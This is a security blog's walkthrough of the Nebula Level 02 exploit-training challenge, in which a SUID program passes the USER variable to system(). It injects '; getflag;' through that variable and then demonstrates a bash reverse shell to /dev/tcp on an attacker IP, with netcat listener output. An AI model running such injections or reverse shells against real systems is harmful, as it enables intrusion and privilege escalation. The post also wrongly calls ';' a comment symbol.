<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.css" />
<script async defer src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.js"></script>
<script>
window.addEventListener("load", function(){
window.cookieconsent.initialise({
  "palette": {
    "popup": {
      "background": "#424242"
    },
    "button": {
      "background": "#2a7ae2"
    }
  },
  "content": {
    "href": "/privacy-policy"
  }
})});
</script>
  
  
  
  <title>Exploit Exercises: Nebula Level 02</title>
  <meta name="description" content="">
  
    
    <meta name="keywords" content="Lucian Nitescu nebula writeups level flag getflag exploit exercise tutorial solution">
  

  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-02/">
  
  
  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
  <meta name="flattr:id" content="njnwdo">
  <!-- Hotjar Tracking Code for https://nitesculucian.github.io/ -->
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:1067531,hjsv:6};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
</script>

  
  <meta name="twitter:card" content="summary">
  
  <meta name="twitter:title" content="Exploit Exercises: Nebula Level 02">
  <meta name="twitter:description" content="">
  
  

  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">

  
  <!-- Google Analytics -->
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-107695141-1', 'auto');
    ga('send', 'pageview');

  </script>


</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Lucian Nitescu</a>

    <nav class="site-nav">
      
        
        <a class="page-link" href="/">Home</a>
      
        
        <a class="page-link" href="/about/">Whoami</a>
      
        
        <a class="page-link" href="/archives/">Archives</a>
      
    </nav>
    <br>Security Blog
  </div>

</header>


    <main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    
      <h1 class="post-title" itemprop="name headline">Exploit Exercises: Nebula Level 02</h1>
    
    <p class="post-meta"><time datetime="2018-07-16T15:36:00-03:00" itemprop="datePublished">Jul 16, 2018</time> •
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/nebula/">nebula</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/writeups/">writeups</a>
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  



</p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p><img src="/uploads/Screenshot%20from%202018-07-16%2000-20-16.png" alt="Image of Nebula Terminal" /></p>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>

<h3 id="source-code">Source code</h3>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>

  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>

  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>

  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>

  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"/bin/echo %s is cool"</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"USER"</span><span class="p">));</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"about to call system(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>

  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="solution">Solution</h3>

<p>After login we go to the flag account folder.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level02@nebula:~$</span> <span class="nb">cd</span> /home/flag02/
<span class="gp">level02@nebula:/home/flag02$</span> <span class="nb">ls</span>
<span class="go">Flag02
</span></code></pre></div></div>

<p>This program is almost the same as the previous one but we can not simply link “/bin/echo” to “/bin/getflag” because of the path “/bin”. But on this line:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"/bin/echo %s is cool"</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"USER"</span><span class="p">));</span>
</code></pre></div></div>

<p>We can observe the “getenv” function which is making our lives easier. If you do not know what “getenv” dose then read the following: http://en.cppreference.com/w/cpp/utility/program/getenv</p>

<p>So let’s try the following export:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level02@nebula:/home/flag02$</span> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span>getflag
<span class="gp">level02@nebula:/home/flag02$</span>
</code></pre></div></div>

<p>At this moment the system variable $USER has the value of “getflag”. Let’s test:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level02@nebula:/home/flag02$</span> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span>getflag
<span class="gp">level02@nebula:/home/flag02$</span> <span class="nb">echo</span> <span class="nv">$USER</span>
<span class="go">getflag
</span></code></pre></div></div>

<p>Now let’s run the application and see the output.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level02@nebula:/home/flag02$</span> ./flag02
<span class="go">about to call system("/bin/echo getflag is cool")
getflag is cool
</span><span class="gp">level02@nebula:/home/flag02$</span>
</code></pre></div></div>

<p>We are controlling the value of $USER but we need to both ensure that we comment the command in order to execute our instructions. In C/C++ we can comment commands with the symbol “;”. So let’s do this:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level02@nebula:/home/flag02$</span> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="s1">'; getflag;'</span>
<span class="gp">level02@nebula:/home/flag02$</span> <span class="nb">echo</span> <span class="nv">$USER</span>
<span class="gp">;</span> getflag<span class="p">;</span>
<span class="gp">level02@nebula:/home/flag02$</span>
</code></pre></div></div>

<p>Now let’s execute:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level02@nebula:/home/flag02$</span> ./flag02
<span class="gp">about to call system("/bin/echo ;</span> getflag<span class="p">;</span> is cool<span class="s2">")
</span><span class="go">
You have successfully executed getflag on a target account
sh: is: command not found
</span><span class="gp">level02@nebula:/home/flag02$</span>
</code></pre></div></div>

<p>Funny thing is that “sh: is: command not found” means that the program is trying to execute system command “is”. Have you ever tried a reverse shell? Ok let’s take control of the user “flag02” because of this SUID vulnerable program.</p>

<p>Steps for standard reverse shell:</p>

<p>Attacker is listening to everything on a port</p>

<p>The target is connecting to the attacker IP on the port (either by standard command or by certain exploits for certain programs ⇒ SUID in our case)</p>

<p>Attacker is sending back commands! ⇒ Reverse Shell</p>

<p>Nebula system (aka target):</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level02@nebula:/home/flag02$</span> <span class="nb">id</span>
<span class="go">uid=1003(level02) gid=1003(level02) groups=1003(level02)
</span><span class="gp">level02@nebula:/home/flag02$</span>
</code></pre></div></div>

<p>⇒ I am logged in as user “level02”</p>

<p>My system (aka attacker) is starting the listening procedure:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lucian@vm:~$</span> nc <span class="nt">-l</span> <span class="nt">-p</span> 8080 <span class="nt">-vvv</span>
<span class="go">Listening on [0.0.0.0] (family 0, port 8080)
</span></code></pre></div></div>

<p>Nebula system (aka target) is making the exploit:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level02@nebula:/home/flag02$</span> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="s1">'; bash -i &gt;&amp; /dev/tcp/192.168.0.104/8080 0&gt;&amp;1;'</span>
</code></pre></div></div>

<p>In other words this is a standard reverse shell command using bash. It could be decrypted as:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash -i &gt;</span>&amp; /dev/tcp/&lt;attcker ip address&gt;/&lt;port that the attacker is listening on&gt; 0&gt;&amp;1
</code></pre></div></div>

<p>Nebula system (aka target) is running the exploit:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">level02@nebula:/home/flag02$</span> ./flag02
<span class="gp">about to call system("/bin/echo ;</span> bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.0.104/8080 0&gt;&amp;1<span class="p">;</span> is cool<span class="s2">")
</span></code></pre></div></div>

<p>At this point my system (aka attacker) can execute commands as “flag02” and not as “level02” from my system (aka attacker) terminal!</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lucian@vm:~$</span> nc <span class="nt">-l</span> <span class="nt">-p</span> 8080 <span class="nt">-vvv</span>
<span class="go">Listening on [0.0.0.0] (family 0, port 8080)
Connection from [192.168.0.101] port 8080 [tcp/http-alt] accepted (family 2, sport 55773)
</span><span class="gp">flag02@nebula:/home/flag02$</span> <span class="nb">id</span>
<span class="go">id
uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)
</span><span class="gp">flag02@nebula:/home/flag02$</span> getflag
<span class="go">getflag
You have successfully executed getflag on a target account
</span><span class="gp">flag02@nebula:/home/flag02$</span>
</code></pre></div></div>

  </div>

  
    <div class="post-comments" itemprop="comment">
      <hr />
<h1>Comments</h1>
<div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://nitesculucian.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

    </div>
  

</article>

      </div>
    </main>

    <footer class="site-footer">

  <div class="wrapper">

    <p>
      

&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>

      | <a href="/privacy-policy" >Privacy Policy</a>
      | <a href="/legal-disclaimer" >Legal Disclaimer</a>
    </p>

  </div>

</footer>


  </body>

</html>
